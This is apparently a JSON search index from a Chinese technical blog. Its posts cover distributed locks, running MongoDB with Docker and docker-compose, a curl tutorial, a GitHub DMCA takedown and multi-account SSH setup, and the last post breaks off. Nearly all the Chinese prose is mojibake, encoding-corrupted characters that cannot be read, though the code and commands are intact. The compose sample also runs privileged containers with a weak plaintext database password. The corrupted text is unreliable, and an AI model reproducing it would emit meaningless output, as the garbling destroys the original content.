åŒä¸€ä¸ªä¸»é”®æ’å…¥æˆåŠŸè·å¾—é”\n+ å…¶ä»–æ’å…¥ä¸»é”®å†²çª, å¤±è´¥\n+ æ‰§è¡ŒæˆåŠŸåˆ é™¤ä¸»é”®, é‡Šæ”¾é”\n\n##### 3.1.3 æ’å®ƒé”å®ç°\n\n+ select for update,æ‹¿åˆ°é”\n+ å…¶ä»–äº‹åŠ¡é˜»å¡\n+ æ‹¿åˆ°é”ä»¥å, commit é‡Šæ”¾é”\n\n### 3.2 redis\n\n1. SETNX + expire å‡½æ•°è§£å†³, 2ä¸ªå‡½æ•°æ²¡æœ‰è¾¾åˆ°åŸå­æ€§\n\n2. SET() é‡Œé¢æœ‰è¿‡æœŸæ—¶é—´, ä¸€ä¸ªå‡½æ•°æå®š, ä½†æ˜¯å…¶ä»–è¿‡æœŸäº†, å¯ä»¥é‡Šæ”¾åˆ«äººçš„é”\n\n3. é€šè¿‡UUID åˆ¤æ–­, åªèƒ½é‡Šæ”¾è‡ªå·±çš„é”\n\n### 3.3 redission\n\nç±»ä¼¼ä¸Šé¢çš„åŸç†, ç›´æ¥ç”¨\n\n### 3.4 zookeeper\n\né€šè¿‡ä¸´æ—¶å’Œåºå·çš„åŸç†, åŠ ä¸Š watch çš„åŸç†\n\n+ åˆ›å»ºä¸´æ—¶åºå·èŠ‚ç‚¹\n+ è·å–æœ€å°çš„èŠ‚ç‚¹æ˜¯å¦æ—¶è¯»é”, å¦‚æœæ˜¯è¯», é‚£ä¹ˆè·å¾—é”\n+ å¦‚æœä¸æ˜¯, é˜»å¡ç­‰å¾…,  æ¯ä¸ªèŠ‚ç‚¹åªç›‘å¬å®ƒçš„ä¸Šä¸€ä¸ªèŠ‚ç‚¹, è·å–é€šçŸ¥\n\n### 3.5 consul\n\nç±»å‹ redis, ä¸¤ä¸ªå‡½æ•°\n\n+ acquir(key, value) æˆåŠŸè¿”å› true, å¤±è´¥è¿”å› false\n+ release(key) åˆ é™¤ key\n\n### 3.6 etcd\n\nç»­çº¦åŠŸèƒ½, é˜²æ­¢æ— æ³•é‡Šæ”¾\n\nRevisionåŠŸèƒ½, æ‰§è¡Œä¼šåŠ ä¸€, ç”¨æ¥åˆ¤æ–­\n\nWatch åŠŸèƒ½, ç›‘å¬ revision æ¯”è‡ªå·±å°çš„\n\nPrefix åŠŸèƒ½ï¼šè·å–ä¸€ä¸ªåˆ—è¡¨\n\n+ æ­¥éª¤ 1\n\n  å®¢æˆ·ç«¯è¿æ¥ Etcdï¼Œä»¥ /lock/mylock ä¸ºå‰ç¼€åˆ›å»ºå…¨å±€å”¯ä¸€çš„ keyï¼Œ\n  å‡è®¾ç¬¬ä¸€ä¸ªå®¢æˆ·ç«¯å¯¹åº”çš„ key=\"/lock/mylock/UUID1\"ï¼Œç¬¬äºŒä¸ªä¸º key=\"/lock/mylock/UUID2\"ï¼›\n\n  å®¢æˆ·ç«¯åˆ†åˆ«ä¸ºè‡ªå·±çš„ key åˆ›å»ºç§Ÿçº¦ - Leaseï¼Œç§Ÿçº¦çš„é•¿åº¦æ ¹æ®ä¸šåŠ¡è€—æ—¶ç¡®å®šï¼Œå‡è®¾ä¸º 15sï¼›\n\n\n+ æ­¥éª¤ 2\n\n  åˆ›å»ºå®šæ—¶ä»»åŠ¡ä½œä¸ºç§Ÿçº¦çš„â€œå¿ƒè·³â€\n  å½“ä¸€ä¸ªå®¢æˆ·ç«¯æŒæœ‰é”æœŸé—´ï¼Œå…¶å®ƒå®¢æˆ·ç«¯åªèƒ½ç­‰å¾…ï¼Œä¸ºäº†é¿å…ç­‰å¾…æœŸé—´ç§Ÿçº¦å¤±æ•ˆï¼Œå®¢æˆ·ç«¯éœ€åˆ›å»ºä¸€ä¸ªå®šæ—¶ä»»åŠ¡ä½œä¸ºâ€œå¿ƒè·³â€è¿›è¡Œç»­çº¦ã€‚æ­¤å¤–ï¼Œå¦‚æœæŒæœ‰é”æœŸé—´å®¢æˆ·ç«¯å´©æºƒï¼Œå¿ƒè·³åœæ­¢ï¼Œkey å°†å› ç§Ÿçº¦åˆ°æœŸè€Œè¢«åˆ é™¤ï¼Œä»è€Œé”é‡Šæ”¾ï¼Œé¿å…æ­»é”ã€‚\n\n+ æ­¥éª¤ 3\n\n  å®¢æˆ·ç«¯å°†è‡ªå·±å…¨å±€å”¯ä¸€çš„ key å†™å…¥ Etcd è¿›è¡Œ put æ“ä½œï¼Œå°†æ­¥éª¤ 1 ä¸­åˆ›å»ºçš„ key ç»‘å®šç§Ÿçº¦å†™å…¥ Etcdï¼Œæ ¹æ® Etcd çš„ Revision æœºåˆ¶ï¼Œå‡è®¾ä¸¤ä¸ªå®¢æˆ·ç«¯ put æ“ä½œè¿”å›çš„ Revision åˆ†åˆ«ä¸º 1ã€2ï¼Œå®¢æˆ·ç«¯éœ€è®°å½• Revision ç”¨ä»¥æ¥ä¸‹æ¥åˆ¤æ–­è‡ªå·±æ˜¯å¦è·å¾—é”ã€‚\n\n+ æ­¥éª¤ 4\n\n  å®¢æˆ·ç«¯ä»¥å‰ç¼€ /lock/mylock è¯»å– keyValue åˆ—è¡¨ï¼ˆkeyValue ä¸­å¸¦æœ‰ key å¯¹åº”çš„ Revisionï¼‰ï¼Œåˆ¤æ–­è‡ªå·± key çš„ Revision æ˜¯å¦ä¸ºå½“å‰åˆ—è¡¨ä¸­æœ€å°çš„ï¼Œå¦‚æœæ˜¯åˆ™è®¤ä¸ºè·å¾—é”ï¼›\n\n  å¦åˆ™ç›‘å¬åˆ—è¡¨ä¸­å‰ä¸€ä¸ª Revision æ¯”è‡ªå·±å°çš„ key çš„åˆ é™¤äº‹ä»¶ï¼Œä¸€æ—¦ç›‘å¬åˆ°åˆ é™¤äº‹ä»¶æˆ–è€…å› ç§Ÿçº¦å¤±æ•ˆè€Œåˆ é™¤çš„äº‹ä»¶ï¼Œåˆ™è‡ªå·±è·å¾—é”ã€‚\n\n+ æ­¥éª¤ 5\n  è·å¾—é”åï¼Œæ“ä½œå…±äº«èµ„æºï¼Œæ‰§è¡Œä¸šåŠ¡ä»£ç ã€‚\n+ æ­¥éª¤ 6 \n  å®Œæˆä¸šåŠ¡æµç¨‹åï¼Œåˆ é™¤å¯¹åº”çš„keyé‡Šæ”¾é”ã€‚\n\n\n\n# 4. å…¶ä»–è¡¥å……\n\n### 4.1 zab å’Œ raft ä»€ä¹ˆåŒºåˆ«\n\n//TODO:\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://www.cnblogs.com/bangerlee/p/6216997.html","tags":["åˆ†å¸ƒå¼"],"categories":["åˆ†å¸ƒå¼"]},{"title":"dockerä¸­ä½¿ç”¨mongodb","url":"%2Fp%2F6fa8633a.html","content":"\n### 1. å®‰è£…\n\n##### 1.1 å®‰è£… mongodb\n\n```bash\nmkdir ~/data\n\nsudo docker pull mongo:latest \n\n# ä¸€å®šè¦æŠŠæ•°æ®å·æš´éœ²å‡ºå», è¿™æ ·æ–¹ä¾¿æ•°æ®è¿ç§»\nsudo docker run -d -p 27017:27017 --name mongo -v /home/liuwei/data:/data/db mongo:latest\n\nsudo docker exec -it mongo mongo\n```\n\n<!-- more -->\n\n\n\n##### 1.2 å°†æ•°æ®è¿ç§»åˆ°æ–°å®¹å™¨\n\nLet's start a new MongoDB container, this time running on port 37017 instead of the default 27017:\n\n```bash\n# Copy the data from the previous container \nsudo cp -r ~/data ~/data_clone  \n\n# Start another MongoDB container \nsudo docker run -d -p 37017:27017 -v ~/data_clone:/data/db mongo\n```\n\n\n\n### 2. ä½¿ç”¨\n\n```sql\ndb.createCollection('cities') \ndb.cities.insert({ name: 'New York', country: 'USA' }) \ndb.cities.insert({ name: 'Paris', country: 'France' }) \ndb.cities.find()\n```\n\n\n\n### 3. å‚è€ƒèµ„æ–™\n\n+ https://www.thachmai.info/2015/04/30/running-mongodb-container/\n\n+ docker-compose ä½¿ç”¨mongodb å‚è€ƒ {% post_link 2-linuxç³»ç»Ÿ/docker/docker-composeçš„ä¸€æ¬¡å®è·µ %}\n\n","tags":["docker"],"categories":["docker"]},{"title":"docker-composeçš„ä¸€æ¬¡å®è·µ","url":"%2Fp%2F331c471e.html","content":"\n\n\n### 0. å‰è¨€\n\nDocker Compose æ˜¯ Docker å®˜æ–¹ç¼–æ’ï¼ˆOrchestrationï¼‰é¡¹ç›®ä¹‹ä¸€ï¼Œè´Ÿè´£å¿«é€Ÿçš„éƒ¨ç½²åˆ†å¸ƒå¼åº”ç”¨ï¼Œå®ƒæ˜¯ç”± `python` ç¼–å†™ã€‚\n\n`Compose` å®šä½æ˜¯å®šä¹‰å’Œè¿è¡Œå¤šä¸ª Docker å®¹å™¨çš„åº”ç”¨ã€‚`Compose` æœ‰ä¸¤ä¸ªé‡ç‚¹\n\n- `docker-compose.yml` `compose` é…ç½®æ–‡ä»¶\n- `docker-compose` å‘½ä»¤è¡Œå·¥å…·\n\n<!-- more -->\n\n### 1. å®‰è£…\n\nwindows å’Œ mac ä¸­ `docker-compose` åœ¨å®‰è£… `docker` çš„æ—¶å€™å°±å·²ç»æ†ç»‘å®‰è£…äº†ã€‚linux ä¸­éœ€è¦è‡ªå·±å®‰è£…\n\n\n```bash\n# ç‰ˆæœ¬å¯ä»¥å» github æŸ¥çœ‹æœ€æ–°çš„ç‰ˆæœ¬\nsudo curl -L \"https://github.com/docker/compose/releases/download/1.24.1/docker-compose-(uname -s)-(uname -m)\" -o /usr/local/bin/docker-compose \n\n\nsudo chmod +x /usr/local/bin/docker-compose \n\ndocker-compose --version\n```\n\n\n\n### 2. ä½¿ç”¨\n\n```bash\ndocker-compose up # å¯åŠ¨\ndocker-compose down # å…³é—­\n```\n\n> docker-compose.yml\n\n```yml\nversion: '3' # å®šä¹‰ç‰ˆæœ¬ï¼Œä¸æŒ‡å®šé»˜è®¤ä¸ºç‰ˆæœ¬ 1ï¼Œæ–°ç‰ˆæœ¬åŠŸèƒ½æ›´å¤š\n\n\nservices:\n\n  mongo4:\n    image: mongo:4\n    privileged: true\n    restart: unless-stopped\n    volumes:  \n      - $HOME/transcode/data/db/:/data/db/\n      - ./mongo/mongo-init.js:/docker-entrypoint-initdb.d/mongo-init.js:ro\n    container_name: mongo4\n    environment:\n      MONGO_INITDB_ROOT_USERNAME: yx1\n      MONGO_INITDB_ROOT_PASSWORD: test\n      MONGO_INITDB_DATABASE: transcode_v1\n    network_mode: bridge # åŠ ä¸Šä¸ä¼šåˆ›å»ºé»˜è®¤çš„æ¡¥, å³æœ‰ä¸€ä¸ªä¸ºç©º, å°±ä¼šåˆ›å»ºä¸€ä¸ªé»˜è®¤ network\n    ports: # æš´éœ²ç«¯å£ä¿¡æ¯\n      - \"47047:27017\"\n\n\n\n  transcode-service:\n    build: service # æŒ‡å®š Dockerfile æ‰€åœ¨æ–‡ä»¶å¤¹çš„è·¯å¾„\n    privileged: true # å…è®¸å®¹å™¨ä¸­è¿è¡Œä¸€äº›ç‰¹æƒå‘½ä»¤\n    restart: unless-stopped\n    volumes:\n     - /var/lib/oceans/:/var/lib/oceans/\n    container_name: transcode-service\n    network_mode: host\n\n\n  transcode-webapi:\n    build: webapi\n    privileged: true\n    restart: unless-stopped\n    container_name: transcode-webapi\n    network_mode: host\n```\n\n\n\nç„¶ååœ¨ webapi, service æ–‡ä»¶å¤¹å†…åˆ›å»ºå„è‡ªçš„ dockerfile æ–‡ä»¶\n\n\n\n\n> ./mongo/mongo-init.js\n\n```javascript\ndb.createUser(\n    {\n        user: \"yx1\",\n        pwd: \"test\",\n        roles:[\n            {\n                role: \"readWrite\",\n                db:   \"transcode_v1\"\n            }\n        ]\n    }\n);\n```\n\n\n\n##### 2.1 é»˜è®¤ç½‘æ¡¥é—®é¢˜\n\ndocker-compose å¯åŠ¨åä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªç½‘æ¡¥, å¦‚æœä¸æƒ³åˆ›å»º, å³æ¯ä¸ªå®¹å™¨éƒ½å†™ä¸Šå€¼, ä¸èƒ½ä¸ºç©º\n\n```yaml\nnetwork_mode: bridge\n```\n\nå‚è€ƒ: https://stackoverflow.com/a/43755216\n\n\n\n##### 2.2 mongo å¯åŠ¨åè‡ªåŠ¨åˆ›å»ºç”¨æˆ·\n\nå‚è€ƒ: https://stackoverflow.com/a/54064268\n\n\n\n### 3. å‚è€ƒèµ„æ–™\n\n+ https://yeasy.gitbooks.io/docker_practice/compose/\n+ https://juejin.im/post/5d17442e518825559f46ed92","tags":["docker-compose"],"categories":["docker"]},{"title":"curlå‘½ä»¤çš„ä½¿ç”¨æ€»ç»“","url":"%2Fp%2Fda64728.html","content":"\n[curl](http://curl.haxx.se/)æ˜¯ä¸€ç§å‘½ä»¤è¡Œå·¥å…·ï¼Œä½œç”¨æ˜¯å‘å‡ºç½‘ç»œè¯·æ±‚ï¼Œç„¶åå¾—åˆ°å’Œæå–æ•°æ®ï¼Œæ˜¾ç¤ºåœ¨\"æ ‡å‡†è¾“å‡º\"ï¼ˆstdoutï¼‰ä¸Šé¢ã€‚\n\n### 1. ä½¿ç”¨æ•™ç¨‹\n\n##### 1.1 æŸ¥çœ‹ç½‘é¡µæºç å’Œä¿å­˜\n\n```bash\ncurl www.sina.com\n```\n\nå¦‚æœè¦æŠŠè¿™ä¸ªç½‘é¡µä¿å­˜ä¸‹æ¥ï¼Œå¯ä»¥ä½¿ç”¨`-o`å‚æ•°ï¼Œè¿™å°±ç›¸å½“äºä½¿ç”¨wgetå‘½ä»¤äº†ã€‚\n\n```bash\ncurl -o [æ–‡ä»¶å] www.sina.com\n```\n\n<!-- more -->\n\n##### 1.2 æ˜¾ç¤ºå“åº”å¤´ä¿¡æ¯\n\n`-i`å‚æ•°å¯ä»¥æ˜¾ç¤ºhttp responseçš„å¤´ä¿¡æ¯ï¼Œè¿åŒç½‘é¡µä»£ç ä¸€èµ·ã€‚`-I`å‚æ•°åˆ™æ˜¯åªæ˜¾ç¤ºhttp responseçš„å¤´ä¿¡æ¯ã€‚\n\n```bash\ncurl -i www.sina.com\n```\n\n\n\n##### 1.3 æ˜¾ç¤ºé€šä¿¡è¿‡ç¨‹\n\n`-v`å‚æ•°å¯ä»¥æ˜¾ç¤ºä¸€æ¬¡httpé€šä¿¡çš„æ•´ä¸ªè¿‡ç¨‹ï¼ŒåŒ…æ‹¬ç«¯å£è¿æ¥å’Œhttp requestå¤´ä¿¡æ¯ã€‚\n\n```bash\ncurl -v www.sina.com\n```\n\nå¦‚æœä½ è§‰å¾—ä¸Šé¢çš„ä¿¡æ¯è¿˜ä¸å¤Ÿï¼Œé‚£ä¹ˆä¸‹é¢çš„å‘½ä»¤å¯ä»¥æŸ¥çœ‹æ›´è¯¦ç»†çš„é€šä¿¡è¿‡ç¨‹ã€‚\n\n```bash\ncurl --trace output.txt www.sina.com\ncurl --trace-ascii output.txt www.sina.com\n```\n\nè¿è¡Œåï¼Œè¯·æ‰“å¼€output.txtæ–‡ä»¶æŸ¥çœ‹ã€‚\n\n\n\n### 2. å‘é€æ•°æ®\n\n##### 2.1 å‘é€GET\n\nGETæ–¹æ³•ç›¸å¯¹ç®€å•ï¼Œåªè¦æŠŠæ•°æ®é™„åœ¨ç½‘å€åé¢å°±è¡Œã€‚\n\n```bash\ncurl example.com/form.cgi?data=xxx\n```\n\n\n\n##### 2.2 å‘é€POST\n\nPOSTæ–¹æ³•å¿…é¡»æŠŠæ•°æ®å’Œç½‘å€åˆ†å¼€ï¼Œcurlå°±è¦ç”¨åˆ°--dataå‚æ•°ã€‚\n\n```bash\ncurl -X POST --data \"data=xxx\" example.com/form.cgi\n```\n\nå¦‚æœä½ çš„æ•°æ®æ²¡æœ‰ç»è¿‡è¡¨å•ç¼–ç ï¼Œè¿˜å¯ä»¥è®©curlä¸ºä½ ç¼–ç ï¼Œå‚æ•°æ˜¯`--data-urlencode`ã€‚\n\n```bash\ncurl -X POST --data-urlencode \"date=April 1\" example.com/form.cgi\n\n# å¦‚æœç¼–ç å‰æœ‰=å·, éœ€è¦æå‰ç¼–ç \n--data-urlencode  'value=-vf scale=-2:360'   # é”™è¯¯\n--data-urlencode  'value=-vf scale%3d-2:360' # æ­£ç¡®\n```\n\n\n\n##### 2.3 HTTPåŠ¨è¯\n\ncurlé»˜è®¤çš„HTTPåŠ¨è¯æ˜¯GETï¼Œä½¿ç”¨`-X`å‚æ•°å¯ä»¥æ”¯æŒå…¶ä»–åŠ¨è¯ã€‚\n\n```bash\ncurl -X DELETE www.example.com\n```\n\n\n\n##### 2.4 å¢åŠ å¤´ä¿¡æ¯\n\næœ‰æ—¶éœ€è¦åœ¨http requestä¹‹ä¸­ï¼Œè‡ªè¡Œå¢åŠ ä¸€ä¸ªå¤´ä¿¡æ¯ã€‚`--header` æˆ– `-H `å‚æ•°å°±å¯ä»¥èµ·åˆ°è¿™ä¸ªä½œç”¨ã€‚\n\n```bash\ncurl --header \"Content-Type:application/json\" http://example.com\n```\n\n\n\n##### 2.5 HTTPè®¤è¯\n\næœ‰äº›ç½‘åŸŸéœ€è¦HTTPè®¤è¯ï¼Œè¿™æ—¶curléœ€è¦ç”¨åˆ°`--user`å‚æ•°ã€‚\n\n```bash\ncurl --user name:password example.com\n```\n\n\n\n##### 2.6 cookie\n\nä½¿ç”¨`--cookie`å‚æ•°ï¼Œå¯ä»¥è®©curlå‘é€cookieã€‚\n\n```bash\ncurl --cookie \"name=xxx\" www.example.com\n```\n\nè‡³äºå…·ä½“çš„cookieçš„å€¼ï¼Œå¯ä»¥ä»http responseå¤´ä¿¡æ¯çš„`Set-Cookie`å­—æ®µä¸­å¾—åˆ°ã€‚\n\n\n\n`-c cookie-file`å¯ä»¥ä¿å­˜æœåŠ¡å™¨è¿”å›çš„cookieåˆ°æ–‡ä»¶ï¼Œ`-b cookie-file`å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶ä½œä¸ºcookieä¿¡æ¯ï¼Œè¿›è¡Œåç»­çš„è¯·æ±‚ã€‚\n\n```bash\ncurl -c cookies http://example.com\ncurl -b cookies http://example.com\n```\n\n\n\n##### 2.7 User Agentå­—æ®µ\n\nè¿™ä¸ªå­—æ®µæ˜¯ç”¨æ¥è¡¨ç¤ºå®¢æˆ·ç«¯çš„è®¾å¤‡ä¿¡æ¯ã€‚æœåŠ¡å™¨æœ‰æ—¶ä¼šæ ¹æ®è¿™ä¸ªå­—æ®µï¼Œé’ˆå¯¹ä¸åŒè®¾å¤‡ï¼Œè¿”å›ä¸åŒæ ¼å¼çš„ç½‘é¡µï¼Œæ¯”å¦‚æ‰‹æœºç‰ˆå’Œæ¡Œé¢ç‰ˆã€‚\n\n```bash\ncurl --user-agent \"[User Agent]\" [URL]\n```\n\n\n\n##### 2.8 Refererå­—æ®µ\n\næœ‰æ—¶ä½ éœ€è¦åœ¨http requestå¤´ä¿¡æ¯ä¸­ï¼Œæä¾›ä¸€ä¸ªrefererå­—æ®µï¼Œè¡¨ç¤ºä½ æ˜¯ä»å“ªé‡Œè·³è½¬è¿‡æ¥çš„ã€‚\n\n```bash\ncurl --referer http://www.example.com http://www.example.com\n```\n\n\n\n##### 2.9 æ–‡ä»¶ä¸Šä¼ \n\nå‡å®šæ–‡ä»¶ä¸Šä¼ çš„è¡¨å•æ˜¯ä¸‹é¢è¿™æ ·ï¼š\n\n```html\n<form method=\"POST\" enctype='multipart/form-data' action=\"upload.cgi\">\nã€€ã€€ã€€ã€€<input type=file name=upload>\nã€€ã€€ã€€ã€€<input type=submit name=press value=\"OK\">\nã€€ã€€</form>\n```\n\nä½ å¯ä»¥ç”¨curlè¿™æ ·ä¸Šä¼ æ–‡ä»¶ï¼š\n\n```bash\ncurl --form upload=@localfilename --form press=OK [URL]\n```\n\n\n\n##### 2.10 ç»ˆæå‘½ä»¤\n\n```bash\ncurl --help\n```\n\n","tags":["curl"],"categories":["å‘½ä»¤"]},{"title":"è¿‘æœŸåšå®¢çš„æŠ˜è…¾å‘½è¿","url":"%2Fp%2F1dd7dc05.html","content":"\n\n\n### 1. github DMCA takedown\n\nå‰ä¸¤å¤©, å‘ç°blogçªç„¶æ— æ³•æäº¤äº†. å»é‚®ç®±é‡Œçœ‹githubå‘çš„é‚®ä»¶æ‰çŸ¥é“æœ‰ä¸€ç¯‡åšæ–‡æ¶‰åŠåˆ°jetbrainsç‰ˆæƒé—®é¢˜, è®©24å°æ—¶å†…å¤„ç†, åæ¥å®Œç¾é”™è¿‡äº†æ—¶é—´. å°±ç›´æ¥è¢«takedownäº†.\n\n\n\n### 2. æŠ˜è…¾è¿‡ç¨‹\n\ntakedownåä¸€è„¸æ‡µé€¼, åœ¨ç½‘ä¸ŠæŸ¥è¯¢çš„è§£å†³æ–¹æ¡ˆåŸºæœ¬éƒ½æ˜¯ç»™githubå‘é‚®ä»¶, è¯·æ±‚åˆ é™¤ä»“åº“æˆ–è€…å†ç»™ä¸€æ¬¡å®½é™24å°æ—¶çš„å¤„ç†æ—¶é—´. \n\näºæ˜¯æˆ‘è¯•ç€å‘äº†ä¸€å°é‚®ä»¶, æ²¡æƒ³åˆ°10å¤©åæ‰å¾—åˆ°å›å¤ (è¿™æ•ˆç‡~~~). å›å¤çš„æ—¶é—´è¿˜åœ¨åä¸€å‡æœŸå†…, è™½ç„¶åˆç»™æˆ‘äº†24å°æ—¶å¤„ç†, åˆè¢«æˆ‘å®Œç¾é”™è¿‡äº†.(!!!!!ä¸€å®šè¦å®šæœŸæŸ¥çœ‹é‚®ä»¶)\n\n<!-- more -->\n\näºæ˜¯åˆæƒ³åˆ°äº†ä»¥ä¸‹ä¸‰ä¸ªè§£å†³æ–¹æ¡ˆ:\n\n+ å‘é‚®ä»¶è®© github ç›´æ¥åˆ é™¤ä»“åº“(å› ä¸ºæ˜¯blog, æœ¬åœ°æœ‰å¤‡ä»½), ç„¶åå†é‡æ–°å»ºåº“.\n+ éƒ¨ç½²åˆ°å…¶ä»–å¹³å° (å¦‚ coding æˆ– è‡ªå·±çš„æœåŠ¡å™¨ä¸Š)\n+ éƒ¨ç½²åˆ°å°å·çš„ github ä¸Š\n\n\n\nä¸ºäº†çœäº‹, æˆ‘æœ€åçš„è§£å†³æ–¹æ¡ˆæ˜¯:\n\n1. å…ˆå‘é€githubç»™äºˆåˆ é™¤ä»“åº“çš„é‚®ä»¶(æˆªè‡³åˆ°å†™blogçš„æ—¶é—´, è¿˜æ²¡æœ‰å¾—åˆ°å›å¤) \n\n2. ç„¶ååœ¨å°å·çš„githubä¸Šåˆ›å»ºäº†ä»“åº“. ç„¶åæŠŠæœ¬åœ°blogæäº¤ä¸Šå». é‡æ–°æŠŠåŸŸåç»‘å®šgithub pageå³å¯.\n\n   \n\n   \n\n> ä¸ºä»€ä¹ˆè¯´æŠ˜è…¾å‘¢!!!!!!  \n\n\n\nåœ¨å°å·ç»‘å®šCNAMEæ—¶, æç¤ºåŸŸåCNAMEè¢«å ç”¨, è¦å…ˆåˆ é™¤ä¹‹å‰çš„åŸŸåç»‘å®š, å› ä¸ºä¹‹å‰çš„ä»“åº“è¢«takedownäº†æ— æ³•ç¼–è¾‘åˆ é™¤, å°å·ä»“åº“å°±æ— æ³•æ·»åŠ .  çœŸçš„æ˜¯æ— fuckè¯´\n\n\n\nåæ¥å°å·åˆå‘äº†ä¸€å°é‚®ä»¶è¯´CNAMEè¢«å ç”¨, å›å¤è®©æˆ‘åœ¨åŸŸåè§£æé‡ŒåŠ ä¸€æ¡TXTè®°å½•, ç…§åšå, å‡ å¤©åå°±å¯ä»¥äº†.\n\n\n\n### 3. äº‹ä»¶æ•™è®­\n\n+ ä¸€æ ·è¦æé«˜ç‰ˆæƒæ„è¯†.\n\n+ å®šæœŸæŸ¥çœ‹é‚®ä»¶, å®šæœŸæŸ¥çœ‹é‚®ä»¶, å®šæœŸæŸ¥çœ‹é‚®ä»¶","categories":["ä¸ªäººè®°å½•"]},{"title":"githubå¤šå¸å·ç™»å½•çš„é—®é¢˜","url":"%2Fp%2F899d7696.html","content":"\n\n\n### 1. åŒä¸€å°ç”µè„‘æœ‰2ä¸ªgithubè´¦å·ï¼Ÿ\n\n+ é¦–å…ˆè¦ä¸ºæ¯ä¸ªå¸å·ç”Ÿæˆå…¬é’¥ç§é’¥å¯¹, å¹¶ä¸”è®¾ç½®åˆ° github é‡Œ, å‚è€ƒ {% post_link 2-linuxç³»ç»Ÿ/git/githubå’Œgiteeé€šè¿‡å¯†é’¥æ¥è¿›è¡Œsshè¿æ¥ %}\n\n+ ä¿®æ”¹ `~/.ssh/config`, è®¾ç½®å¦‚ä¸‹\n\n```bash\nHost unix2dos\n        HostName github.com\n        IdentityFile ~/.ssh/github-unix2dos\n        User unix2dos\nHost levonfly\n        HostName github.com\n        IdentityFile ~/.ssh/github-levonfly\n        User levonfly\n```\n\næµ‹è¯•:\n```bash\nssh -T git@unix2dos\nssh -T git@levonfly\n```\n<!-- more -->\n\n+ è¦ä¿®æ”¹ä»“åº“çš„ remote url, å¯¹åº” `~/.ssh/config` æ‰€å¡«å†™çš„å€¼.  æ³¨æ„, è¦ä¿®æ”¹ git@åé¢çš„è¿™ä¸ªå€¼\n\n```bash\ngit remote set-url origin git@unix2dos:unix2dos/LevonRecord.git\n```\n\n\n\n- ä¸€å®šè¦è®¾ç½®ç”¨æˆ·åå’Œé‚®ç®±.å¦åˆ™è™½ç„¶å¯ä»¥æäº¤ commit, ä½†æ˜¯ä¸è®¤è¯†ä½ æ˜¯è°\n\n  \n\n- å»ºè®® global ç”¨ä¸€ä¸ª,  å…¶ä»–é¡¹ç›®ç”¨å¦å¤–çš„ç”¨æˆ·å\n\n```bash\ngit config -l\n\ngit config --global user.name \"unix2dos\"\ngit config --global user.email \"levonfly@gmail.com\" \n\n\ngit config user.name \"levonfly\"\ngit config user.email \"6241425@qq.com\" \n```\n\n\n\n### 2. macåˆ‡æ¢ç”¨æˆ·æäº¤å¤±è´¥çš„é—®é¢˜\n\næäº¤æ€»æ˜¯å‡ºç°permission deniedçš„é—®é¢˜ï¼Œç”¨git config --globalæ›´æ–°äº†usernameå’Œemailä¹Ÿä¸è¡Œã€‚\n\nmac osåŸå› æ˜¯å³ä¾¿æ›´æ–°äº†usernameå’Œemailï¼Œmacåœ¨git pushæ—¶è¿˜æ˜¯ä¼šä½¿ç”¨å†å²è´¦å·çš„å¯†ç ã€‚\n\n> è§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š\n\n1. è¿›å…¥Keychain Access (ä¸çŸ¥é“åœ¨å“ªå„¿çš„å¯ä»¥command+spaceæŸ¥æ‰¾)\n2. åœ¨æœç´¢æ¡†è¾“å…¥'git'è¿›è¡ŒæŸ¥æ‰¾ï¼Œå°†æ‰¾åˆ°çš„æ–‡ä»¶åˆ æ‰ï¼Œè¿™é‡Œä¿å­˜äº†å†å²è´¦å·çš„ä¿¡æ¯\n3. åˆ é™¤ä¹‹åé‡æ–°ç”¨git config --globalæ›´æ–°usernameå’Œemailå³å¯ï¼Œä¹‹ågit pushä¼šè¦æ±‚ä½ è¾“å…¥usernameå’Œpassword\n4. done!\n\n\nå‚è€ƒ: https://www.zhihu.com/question/23028445/answer/399033488\n\n\n\n\n### 3. å‚è€ƒèµ„æ–™\n\n+ https://gist.github.com/jexchan/2351996\n+ https://www.zhihu.com/question/23028445/answer/399033488","tags":["github"],"categories":["git"]},{"title":"sessionçš„ä»‹ç»å’Œä½¿ç”¨","url":"%2Fp%2F312a7a36.html","content":"\n\n\n### 0. å‰è¨€\n\né™¤äº†ä½¿ç”¨Cookieï¼ŒWebåº”ç”¨ç¨‹åºä¸­è¿˜ç»å¸¸ä½¿ç”¨Sessionæ¥è®°å½•å®¢æˆ·ç«¯çŠ¶æ€ã€‚Sessionæ˜¯æœåŠ¡å™¨ç«¯ä½¿ç”¨çš„ä¸€ç§è®°å½•å®¢æˆ·ç«¯çŠ¶æ€çš„æœºåˆ¶ï¼Œä½¿ç”¨ä¸Šæ¯”Cookieç®€å•ä¸€äº›ï¼Œç›¸åº”çš„ä¹Ÿå¢åŠ äº†æœåŠ¡å™¨çš„å­˜å‚¨å‹åŠ›ã€‚\n\n\n\nSessionåœ¨ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®æœåŠ¡å™¨çš„æ—¶å€™è‡ªåŠ¨åˆ›å»ºã€‚å®¢æˆ·ç«¯åªä¿å­˜sessionidåˆ°cookieä¸­ï¼Œè€Œä¸ä¼šä¿å­˜sessionï¼Œsessioné”€æ¯åªèƒ½é€šè¿‡invalidateæˆ–è¶…æ—¶(é»˜è®¤30åˆ†é’Ÿ)ï¼Œå…³æ‰æµè§ˆå™¨å¹¶ä¸ä¼šå…³é—­sessionã€‚\n\n<!-- more -->\n\n### 1. session ä»‹ç»\n\n##### 1.1 